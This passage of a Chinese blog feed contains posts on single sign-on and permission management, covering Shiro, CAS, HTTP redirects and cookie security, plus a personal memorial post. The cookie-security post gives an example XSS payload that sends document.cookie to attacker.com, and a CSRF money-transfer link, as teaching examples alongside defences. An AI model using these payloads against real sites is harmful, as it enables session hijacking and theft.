class="name">shiro:hasPermission</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>只有前端验证也不行，可以通过模拟HTTP请求绕过前端访问，后端也要进行验证，shiro提供了拦截器进行统一处理。</p>
<h4 id="Shiro基本架构和扩展"><a href="#Shiro基本架构和扩展" class="headerlink" title="Shiro基本架构和扩展"></a>Shiro基本架构和扩展</h4><p>Shiro是apache下的开源软件，一个的安全框架，对用户的身份和权限进行管理和验证，看看官网对它的概述：</p>
<blockquote>
<p>Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management</p>
</blockquote>
<p>本篇不会介绍Shiro的细节，只是通过介绍Shiro的基本组件，对应到权限管理的一般模型。</p>
<p>Shiro的基本架构如下：</p>
<ol>
<li>Subject：当前与用户交互的实体，包括用户、第三方服务、corn任务等，使用者只需通过该对象提供的一系列方法，统一与后端的安全管理模块交互， 对应模型中的「用户」；</li>
<li>Authenticator：负责验证用户身份，用户尝试登陆时，会调用它的方法进行认证，它会根据配置，调用一个或多个Realm进行用户名和密码校验，对应模型中的「用户登陆操作」；</li>
<li>Authorizer：负责验证用户访问权限，用户访问一个页面时，可以根据它提供的方法验证用户的权限，它也会调用一个或多个Realm获取用户的权限数据，对应模型中的「是否有权限访问」；</li>
<li>SessionManager：提供一种健壮的方式管理用户会话，这是Shiro的一个独特特性，如果是一个Web/Servlet应用，默认会使用已有的会话管理，如果不是Web应用，Shiro会使用内置的会话管理器。它会调用SessionDAO进行会话持久化，对应模型中的「Session管理」；</li>
<li>CacheManager：Shiro在Authenticator、Authorizer、SessionManager模块，会访问后端的存储系统，使用缓存管理可以提高数据访问的性能，可以很方便的与第三方缓存框架集成，比如Ehcache，Redis等；</li>
<li>Realms：是程序和用户数据、权限数据的桥梁，以插件的方式提供扩展，可以配置一个或多个Realm为Authenticator和Authorizer模块提供数据支持；</li>
<li>Cryptography：提供数据加解密的支持，它封装了相关接口，更易理解和使用；</li>
</ol>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15207632918475.jpg" alt="Shiro基本架构"></p>
<blockquote>
<p>通过上面的介绍可以看出，Shiro的基本组件与总结的「一般模型」是对应的，它帮助我们实现了整个用户验证、权限验证、会话管理的流程，同时提供缓存管理、加解密封装提高了性能和安全性，通过Realm插件的方式支持扩展，自定义实现类获取用户、权限数据。</p>
</blockquote>
<p>以用户身份认证为例，说明几个组件的交互过程：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15207683549937.jpg" alt="基本交互过程"></p>
<h4 id="系列第一部分总结"><a href="#系列第一部分总结" class="headerlink" title="系列第一部分总结"></a>系列第一部分总结</h4><p>到此，系列第一部分「单点登录与权限管理本质」就介绍完了，通过5篇文章，把自己想说的本质说完了，基础概念肯定会有遗漏，后续部分学习、总结过程中，会不断补充。</p>
<p>还原技术的本质，把复杂的技术、框架抽象来看，形成一个相对简单、容易理解的视图，能够更好的理解、扩展、应用它。</p>
<p>对于单点登录，通过cookie、http重定向，可自动进行跳转和身份验证，达到登录一次，可访问多个子系统的效果。</p>
<p>对于权限管理，了解其一般的模型和验证流程，加上成熟的实现框架，可以快速、全面、稳定地实现它，并在此基础上进行扩展。</p>
<p>另外，cookie、用户的账号权限信息很重要，要不断积累安全方面的知识，提高其安全性。</p>
<p>接下来的第二部分主要是实践，会仿照我们的系统做一个DEMO，利用CAS、Shiro框架实现单点登录和权限管理。另外，会抽象出一个「用户中心」，管理用户、角色、权限菜单，各个子系统通过同步方式同步自己的权限菜单。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 单点登录与权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 权限管理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[单点登录与权限管理本质：cookie安全问题]]></title>
      <url>https://qqdong.github.io/2018/03/10/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E5%9B%9B%EF%BC%9Acookie%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>该系列好多天没更新了，前几天请假回老家了，外公去世了。工作上也开始忙了，开始了所谓的「996」，为节奏和效率堪忧。</p>
<p>继续介绍「单点登录与权限管理」系列的第一部分：单点登录与权限管理本质，前一篇文章介绍了单点登录概念，以CAS协议的基本流程为例讲解了系统间的交互过程，过程中，cookie的设置和传输涉及的比较多，如何保证cookie的安全性，是这篇文章要介绍的。</p>
<p>该系列的完整写作计划，可见：<a href="http://qqidol.com/2018/02/24/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%B3%BB%E5%88%97/" target="_blank" rel="noopener">系列概述</a></p>
<p>安全相关的知识，了解的也有限，我阅读了相关的文章，按照自己的思路、理解，进行了梳理和总结。</p>
<p>如果把安全问题按照发生区域来划分的话，所有发生在后端服务器的安全问题称为「后端安全问题」，比如SQL注入；所有发生在浏览器、web页面中的安全问题称为「前端安全问题」，比如XSS跨站脚本攻击，cookie相关的问题主要在前端。</p>
<p>首先会介绍下2个攻击，XSS可获取用户的cookie，CSRF可利用用户的cookie伪造请求，然后介绍下HTTPS及它的重要性，最后说下跨域访问cookie的限制，HTTP设置cookie时对cookie操作的控制。</p>
<a id="more"></a>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>XSS称为跨站脚本攻击，全称为Cross-Site Scripting，这类安全问题发生的本质原因是浏览器将攻击者提供的用户输入数据当做JavaScript脚本执行了。</p>
<p>XSS有不同的分类方法，按照恶意脚本是否在应用中存储，可以划分为「存储型XSS」和「反射性XSS」；按照是否和服务端有交互，可以划分为「Server Side XSS」和「DOM based XSS」。</p>
<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>场景说明：一些系统，在用户输入或操作错误后，会跳转到错误信息提示页面，服务器根据传入的message显示不同的错误信息。</p>
<p>如果服务端不对message进行过滤，就会收到XSS攻击，比如请求URL：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//support.kefu.mi.com?msg=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i=<span class="keyword">new</span> Image;</span><br><span class="line">i.src=<span class="string">"http://attacker.com/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; value=&quot;$&#123;msg&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>如果被攻击者通过访问这个恶意的URL，就会把cookie发给黑客，黑客截获cookie，就能执行用户的任意操纵。</p>
<h5 id="保存型XSS"><a href="#保存型XSS" class="headerlink" title="保存型XSS"></a>保存型XSS</h5><p>对于保存型XSS，脚本通常保存在后端数据库中，不经过滤就存储并显示给用户。与反射型的流程不同的是，需要至少两次请求，第一次将含有恶意代码的数据提交给服务器，保存到数据库，第二次是受害者访问含有恶意代码的页面，恶意代码执行。</p>
<h5 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM based XSS"></a>DOM based XSS</h5><p>其实也是反射型的一种，因为也是通过url控制页面的输出，不同点只是输出地点不同而导致结果不一致。</p>
<p>加入请求URL和反射XSS相同:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//support.kefu.mi.com?msg=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i=<span class="keyword">new</span> Image;</span><br><span class="line">i.src=<span class="string">"http://attacker.com/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>显示页面如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"msg"</span> type=<span class="string">"text"</span> value=<span class="string">"$&#123;msg&#125;"</span> /&gt;</span><br><span class="line">&lt;div id=<span class="string">"show"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>); </span><br><span class="line"><span class="keyword">var</span> show = <span class="built_in">document</span>.getElementById(<span class="string">"show"</span>);</span><br><span class="line">show.innerHTML = msg.value;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>防御XSS最佳的做法是对数据进行严格的输出编码，使得攻击者提供的数据不再被浏览器认为是脚本而被误执行。</p>
<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>CSRF称为跨站请求伪造，全称是Cross Site Request Forgery，它可以在受害者毫不知情的情况下，以受害者的名义伪造请求发送给受攻击站点。</p>
<p>场景说明：小米金融网站A，有一个如下的转账接口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000</span></span><br></pre></td></tr></table></figure>
<p>黑客H有一个网站B，在网站中放入如下代码，通过广告诱使受害者点击。如果受害者之前登录过网站A，且session还未过期，就会在受害者不知情的情况下，成功转账给黑客。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">'http://jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>可以通过验证HTTP Referer字段、在请求地址中添加token并验证、在HTTP头中自定义属性并验证等方法进行解决；</p>
<h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>建议所有对外网开放的站点都通过HTTPS，它是在HTTP协议的基础上，加入了SSL层，对数据进行加密处理。</p>
<p>通过HTTPS协议，cookie在传输的过程中，即使被别人劫持到请求，也不知道实际的cookie是什么，无法伪造其他的请求。</p>
<p>HTTPS相关的介绍在网上很多，这里描述下交互过程：</p>
<ol>
<li>浏览器将自己支持的一套加密规则发送给网站；</li>
<li>网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器；（证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息）</li>
<li>浏览器获得网站证书之后，要做以下工作：<ul>
<li>验证证书的合法性（验证颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果验证不通过，会给出证书不受信的提示；</li>
<li>如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密；</li>
<li>使用约定好的HASH计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站；</li>
</ul>
</li>
<li>网站接收浏览器发来的数据之后要做以下的操作：<ul>
<li>使用自己的私钥将信息解密取出随机数密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致；</li>
<li>使用随机数密码加密一段握手消息，发送给浏览器；</li>
</ul>
</li>
<li>浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密；</li>
</ol>
<p>总结下：</p>
<ul>
<li>握手阶段，通过非对称加密算法对传输的数据进行加解密，约定随机数的密码、加密算法、Hash算法；</li>
<li>正常传输数据时，因为非对称加密比较耗时，使用随机数的密码进行加解密，随机数密码在浏览器端生成，通过非对称加密传输给网站，所以不会泄露；</li>
<li>为了防止数据被篡改，通过Hash算法进行校验；</li>
</ul>
<h4 id="Cookie访问控制"><a href="#Cookie访问控制" class="headerlink" title="Cookie访问控制"></a>Cookie访问控制</h4><p>cookie如此重要，在浏览器端，如果一个网站可以访问其他网站的cookie，肯定不行的，所以浏览器是不允许跨域访问cookie的，提高了Cookie的安全性。</p>
<p>在前面的文章 <a href="http://qqidol.com/2018/02/27/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%B8%80%EF%BC%9Asession%E4%B8%8Ecookie%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">session和cookie介绍</a> 中，已经介绍了cookie的作用域，主要是说一级域名相同情况下如何共享使用cookie。</p>
<p>如果想实现跨域访问，可以通过JSONP、CORS的方法实现。</p>
<p>另外，HTTP设置cookie时，提供了2个属性，可以增强cookie的安全性，分别是secure属性和httpOnly属性。</p>
<p>secure属性可防止信息在传递的过程中被监听捕获后导致信息泄露，如果设置为true，可以限制只有通过https访问时，才会将浏览器保存的cookie传递到服务端，如果通过http访问，不会传递cookie。</p>
<p>httpOnly属性可以防止程序获取cookie，如果设置为true，通过js等将无法读取到cookie，能有效的防止XSS攻击。</p>
<blockquote>
<p>通过本篇文章的介绍，为了保障cookie的安全性，应要求通过HTTPS进行访问，在编写代码时充分考虑，尽量避免XSS、CSRF等cookie相关的攻击方法。同时，浏览器和HTTP本身也对cookie的访问控制进行了考虑。</p>
</blockquote>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 单点登录与权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 单点登录 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[外公，一切安好]]></title>
      <url>https://qqdong.github.io/2018/03/05/%E5%A4%96%E5%85%AC%EF%BC%8C%E4%B8%80%E5%88%87%E5%AE%89%E5%A5%BD/</url>
      <content type="html"><![CDATA[<p>2018年3月1号，妈妈的一通电话打破了内心的安定，外公突发高血压导致脑干出血，进了重病监护室，情况十分严重，心突然一下沉沉的。</p>
<p>小的时候，外公一直带我，宠着我、疼着我、有时也会教育我。一起在平房上、院子里睡觉数星星的夜晚，偷偷塞给我的零花钱，拉着驾车子推着我去看脚，做错事轻轻打我后又立刻哄我，这些将成为我永远美好的回忆。</p>
<p>2018年3月3号，上午做了简单的工作交接，下午就赶回家了。到家时，外公已经在家了，冷冰冰的氧气管一直插到喉咙里，还有凉凉的输液，勉强在维持着呼吸，外公被医院“判了死刑”。</p>
<p>周围围了不少同村的人，都是来看看外公的，有人在喊，外公的眼睛竟微微的睁开了下，我和小妹还是一直坚信奇迹的发生，从接到电话的那一刻。</p>
<a id="more"></a>
<p>晚上，我看了一整夜，坐在床边，时不时起身看着外公。外公的腿时不时动一下，眼睛也时不时的睁开一点，担心他睁开后看不到人，就凑到旁边，抚摸着他的脸，内心特别难受。另外，我用手机录了外公微弱的呼吸，想一直留着，陪在我身边。</p>
<p>外面的天慢慢亮起来了，但外公没有再睁眼，腿也没再动了，脸色和呼吸也没昨天好了。今天又陆陆续续有村里的人来看外公，都说外公是个好人，干了一辈子辛苦活，我真为你感到骄傲。</p>
<p>今天一天，一直发高烧，起痰也严重了，2018年3月5号凌晨5点钟左右，外公去世了，天上又多一颗闪闪的星。</p>
<p>外公，你不善言谈，但那里不会有人欺负你，因为你是个好人，世界上还是好人多。那里不会孤独，因为外婆也在那里，她不是最听你的话嘛，但不要再像以前那样凶我外婆了。你们要团结、和睦。</p>
<p>7号我将带你去新家，也会替你看中国以后的发展、大好河山，望着天空，静静的说给你听。</p>
<p>外公，一切安好。</p>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 家人 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[单点登录与权限管理本质：单点登录介绍]]></title>
      <url>https://qqdong.github.io/2018/03/01/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p>继续介绍「单点登录与权限管理」系列的第一部分：单点登录与权限管理本质，前两篇介绍了<a href="http://qqidol.com/2018/02/27/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%B8%80%EF%BC%9Asession%E4%B8%8Ecookie%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">session与cookie</a> 和 <a href="http://qqidol.com/2018/02/28/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%BA%8C%EF%BC%9A%E9%87%8D%E5%AE%9A%E5%90%91/" target="_blank" rel="noopener">HTTP重定向</a> ，有了他们，浏览器就可以在多个系统间自动交互，实现自动登录。</p>
<p>该系列的完整写作计划，可见：<a href="http://qqidol.com/2018/02/24/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%B3%BB%E5%88%97/" target="_blank" rel="noopener">系列概述</a></p>
<p>本篇介绍下单点登录，所谓单点登录，就是说用户只需在一个地方登录，访问其他相关系统时，不需要重复登录，隐式地自动登录，这样体验会比较好。</p>
<p>主要从以下几个方面介绍：</p>
<ul>
<li>一个常见的交互流程</li>
<li>常见单点登录协议</li>
<li>关键问题总结</li>
</ul>
<a id="more"></a>
<h4 id="一个常见的交互流程"><a href="#一个常见的交互流程" class="headerlink" title="一个常见的交互流程"></a>一个常见的交互流程</h4><p>我们项目中，使用CAS协议实现单点登录，下面就以项目中的实现为例，先来看下其交互流程，对其实现有个基本的了解。</p>
<p>有2个系统，系统A是「客服工作台」，主要给客服使用，可实时与来访用户及时聊天，解答用户的问题。系统B是「工单系统」，对于不能解答的问题，客服会创建一个工单，更高级别或相关度高的人会看到工单进行处理。</p>
<p>客服希望在登录系统A后，不需要手动登录系统B，需要一个「单点登录服务」，提供一个统一的登录验证，协调系统A、系统B的自动登录，定义该服务为服务S，其CAS协议的场景的流程如下：</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15199187777296.jpg" alt="CAS协议交互图"></p>
<p>花了不少时间画上面的图，看着比较复杂，其实还好，希望大家花时间看下，如果前两篇文章真正理解了，这块就相对简单了。</p>
<p>重点总结下该流程：</p>
<ul>
<li>黑圆圈红字，标识cookie的生成和使用，ABCDE表示5个cookie，1表示生成，2表示使用；</li>
<li>无论是系统A，还是系统B，如果没有jessionid cookie，都会跳转到服务S，如果携带了cookie1（登录成功后生成的cookie），不需要登录，会自动登录，如果没有携带cookie1，会跳转到登录页面，登录成功后会设置cookie1。</li>
<li>cookie1是保持浏览器和服务S的，表示用户已经登录过了；</li>
<li>cookie2、cookie4都是临时cookie，主要是将服务码带到系统A或系统B，拿到服务码后，通过后端请求服务S进行验证，验证过后，临时cookie就失效了，主要是为了安全考虑。</li>
<li>cookie3、cookie5和我们正常登录产生的jessionid一样，是各个子系统独有的cookie；</li>
</ul>
<p>如果还有疑问，可在下面留言，我会第一时间回复。</p>
<h4 id="常见单点登录协议"><a href="#常见单点登录协议" class="headerlink" title="常见单点登录协议"></a>常见单点登录协议</h4><p>上面介绍的是CAS协议的一种，还有其他协议可实现单点登录，比如CAS官网列举的协议：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15199203262677.jpg" alt="常见单点登录协议"></p>
<p>这些协议有不同的适用场景，比如好多网站都支持使用QQ、微信、微博直接登录，只要你的QQ、微信、微博登录者，就不用重复登录，使用OAuth协议可比较好的实现这种场景。</p>
<p>后面会单独介绍这些协议。</p>
<h4 id="关键问题总结"><a href="#关键问题总结" class="headerlink" title="关键问题总结"></a>关键问题总结</h4><p>无论是哪一种协议，都需要一个中间系统，对验证和授权进行统一管理。另外，cookie的管理和安全问题需要重点考虑。</p>
<p>后面一篇会介绍下可能存在哪些安全问题，而对于安全问题如何解决，cookie和session具体如何管理，会在介绍每个具体协议的时候重点说明。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 单点登录与权限管理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 单点登录 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[单点登录与权限管理本质：HTTP重定向]]></title>
      <url>https://qqdong.github.io/2018/02/28/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%BA%8C%EF%BC%9A%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      <content type="html"><![CDATA[<p>继续介绍「单点登录与权限管理」系列的第一部分：单点登录与权限管理本质，本篇说说HTTP重定向，它也是完成单点登录的基础知识。</p>
<p>该系列的完整写作计划，可见文章：<a href="http://qqidol.com/2018/02/24/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%B3%BB%E5%88%97/" target="_blank" rel="noopener">系列概述</a></p>
<p>单点登录需要在多个web项目之间相互跳转，使用重定向技术，自动完成登录操作。另外，当实际资源被迁移到其他URL时，可使用重定向技术，将访问原有URL的请求，自动跳转到新URL，保持原有URL有效。</p>
<p>本篇主要从以下几个方面介绍：</p>
<ul>
<li>重定向基本概念</li>
<li>Nginx重定向</li>
<li>Servlet重定向</li>
<li>Spring使用重定向</li>
</ul>
<a id="more"></a>
<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h5><p>在HTTP协议中，服务器通过发送特定的响应实现重定向，浏览器在接收到响应后，可根据状态码判定重定向，并使用指定的新URL重新请求。重定向的响应状态码为3xx，不同的状态码表示不同的重定向类型。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15198241887086.jpg" alt="重定向的基本原理"> </p>
<p>浏览器从响应头中的Location获取新的URL，重新发送请求。</p>
<h5 id="重定向类型"><a href="#重定向类型" class="headerlink" title="重定向类型"></a>重定向类型</h5><p>重定向类型包括永久重定向、临时重定向、特殊重定向，不同的重定向类型，一方面会影响浏览器的操作，一方面会影响搜索引擎的收录。</p>
<p>永久重定向，是指原URL不再被使用，应优先选择新的URL，搜索引擎机器人会在遇到该状态码时，触发更新操作，使用新的URL。常见的状态码有301，Moved Permanently。</p>
<p>临时重定向，如果请求的资源临时不可用，但可从其他地方访问。搜索引擎不会记录该临时的链接。常见的状态码有302 Found，307 Temporary Redirect。</p>
<p>特殊重定向，304 Not Modified 资源未被修改，会从本地缓存中获取网页；300 Multiple Choice，是一种手工重定向，用户可选择重定向的页面。</p>
<h5 id="设置重定向方法"><a href="#设置重定向方法" class="headerlink" title="设置重定向方法"></a>设置重定向方法</h5><p>除了上面介绍的重定向方法，还可以通过HTML的metay元素，或者JS实现重定向，但还是建议优先选择上面介绍方法。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0;URL=https://www.mi.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>content属性值，第一个数字表示等待多少秒后进行跳转。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location = <span class="string">"https://www.mi.com"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="Nginx重定向"><a href="#Nginx重定向" class="headerlink" title="Nginx重定向"></a>Nginx重定向</h4><h5 id="rewrite"><a href="#rewrite" class="headerlink" title="rewrite"></a>rewrite</h5><p>nginx的rewrite主要功能就是实现URL的重定向，其语法规则如下：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span> &lt;regex&gt; &lt;replacement&gt; [flag]</span><br></pre></td></tr></table></figure>
<p>regex 正则匹配需要重定向的url<br>replacement 替换内容，将正则匹配的内容替换成replacement<br>flag 标记，具体如下：</p>
<ul>
<li>last：本条规则匹配之后，继续向下匹配新的rewrite；</li>
<li>break：本条规则匹配完成即终止，后面的规则不再匹配；</li>
<li>redirect：返回302临时重定向；</li>
<li>permanent：返回301永久重定向；</li>
</ul>
<p>rewirte参数的标签段位置：server,location,if</p>
<h5 id="rewrite示例"><a href="#rewrite示例" class="headerlink" title="rewrite示例"></a>rewrite示例</h5><p>将 mi.com 重定向 www.mi.com</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span> mi.com;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)</span> http://www.mi.com/<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="return"><a href="#return" class="headerlink" title="return"></a>return</h5><p>可通过return直接重定向，如下：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span> example.com;</span><br><span class="line">	<span class="attribute">return</span> <span class="number">301</span> <span class="variable">$scheme</span>://www.mi.com<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Servlet重定向"><a href="#Servlet重定向" class="headerlink" title="Servlet重定向"></a>Servlet重定向</h4><p>首先要区分开转发和重定向的概念，转发是在服务端完成的，浏览器地址栏中的地址不会改变，是一次请求；重定向是在浏览器端完成的，浏览器地址栏会变化，是二次请求。</p>
<p>无论是转发还是重定向，在执行方法前，不要向客户端输出内容.</p>
<h5 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException,IOException </span>&#123; </span><br><span class="line">    response.setContentType(<span class="string">"text/html; charset=utf-8"</span>); </span><br><span class="line">    ServletContext sc = getServletContext();    </span><br><span class="line">    RequestDispatcher dispatcher = <span class="keyword">null</span>; </span><br><span class="line">    dispatcher = sc.getRequestDispatcher(<span class="string">"index.jsp"</span>);              </span><br><span class="line">    dispatcher.forward(request, response); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException,IOException </span>&#123; </span><br><span class="line">    response.setContentType(<span class="string">"text/html; charset=utf-8"</span>); </span><br><span class="line">    response.sendRedirect(<span class="string">"/index.jsp"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Spring使用重定向"><a href="#Spring使用重定向" class="headerlink" title="Spring使用重定向"></a>Spring使用重定向</h4><h5 id="不带参数"><a href="#不带参数" class="headerlink" title="不带参数"></a>不带参数</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="string">"redirect:/toList"</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">"redirect:/toList"</span>;</span><br></pre></td></tr></table></figure>
